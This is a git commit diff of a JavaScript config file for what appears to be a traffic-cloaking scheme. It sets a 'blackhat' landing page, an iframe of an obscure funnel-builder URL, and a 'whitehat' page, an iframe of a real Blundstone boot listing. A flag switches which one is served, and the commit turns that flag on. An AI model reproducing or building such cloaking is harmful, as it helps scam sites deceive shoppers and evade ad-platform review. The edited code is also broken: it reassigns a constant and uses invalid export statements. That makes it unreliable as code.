2221c492e77741877dbfbbcc6afb6cd57ee2999f
rmeeesumraza <github@snobay.com>
2025-01-15 14:43:57 +0500

    Update config.js

--- api/config.js
+++ api/config.js
@@ -1,5 +1,5 @@
 //Set your blackhat landing page
-const bhLPP = `
+const bhLP = `
 <html>
     <body>
         <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
@@ -8,7 +8,7 @@ const bhLPP = `
 `;
 
 //Set your whitehat landing page
-const whLPP = `
+const whLP = `
 <html>
     <body>
         <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://www.blundstone.com/rustic-brown-premium-leather-chelsea-boots-womens-style-585"></iframe>
@@ -17,15 +17,13 @@ const whLPP = `
 `;
 
 //Turn blackhat lander on or off - true = Black Hat - False = White Hat
-// const isRedirectEnabled = true; 
 
-// if (isRedirectEnabled == true) {
-//   bhLP = whLP;
-// }
+const isRedirectEnabled = true; 
 
-const settings = {
-    bhLP: bhLPP,
-    whLP: whLPP;
+if (isRedirectEnabled == true) {
+  bhLP = whLP;
 }
 
-export default settings;
+export bhLP;
+export whLP;
+
